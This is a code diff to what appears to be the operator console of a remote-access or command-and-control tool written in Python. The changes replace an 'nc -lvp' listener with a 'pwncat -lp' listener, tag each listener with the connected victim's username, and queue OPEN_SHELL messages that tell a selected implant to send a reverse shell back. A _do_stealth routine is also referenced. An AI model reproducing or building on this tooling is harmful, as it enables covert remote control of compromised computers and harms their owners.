@@ -1,5 +1,4 @@
-import sys
-from typing import Callable, List, Optional, Tuple
+import errno
 from prompt_toolkit import PromptSession
 from prompt_toolkit.completion import NestedCompleter, DynamicCompleter
 from prompt_toolkit.patch_stdout import patch_stdout
@@ -8,7 +7,8 @@ import os
 import subprocess
 import socket
 from threading import Lock
-import errno
+from time import sleep
+from typing import Callable, List, Optional, Tuple
 
 from core.message import Message, MESSAGE_PURPOSE
 
@@ -126,12 +126,13 @@ class App:
 
     def _do_pwncat(self):
         port = get_open_port()
-        open_new_window_with_cmd(f'nc -lvp {port}', f'nc:{port}')
+        open_new_window_with_cmd(f'pwncat -lp {port}', f'pc:{self.selected_instance.username}@{port}')
+        sleep(1)
         self.selected_instance.messages_to_send.put(Message(MESSAGE_PURPOSE.OPEN_SHELL, [str(port).encode()]))
 
     def _do_open_shell_bash(self):
         port = get_open_port()
-        open_new_window_with_cmd(f'nc -lvp {port}', f'nc:{port}')
+        open_new_window_with_cmd(f'nc -lvp {port}', f'nc:{self.selected_instance.username}@{port}')
         self.selected_instance.messages_to_send.put(Message(MESSAGE_PURPOSE.OPEN_SHELL, [str(port).encode()]))
 
     def _do_stealth(self):
@@ -147,15 +148,14 @@ class App:
 
         if new_instance is not None:
             self.selected_instance = new_instance
-            self._do_open_shell_bash()
+            logger.info(f'New instance connected: {new_instance}')
+            # self._do_open_shell_bash()
 
         else:
             if self.selected_instance not in instances:
                 self.selected_instance = None
             if self.selected_instance is None and len(instances) > 0:
                 self.selected_instance = instances[0]
-
-        self._list_instances()
 
     def _list_instances(self):
         for instance in self._instances:
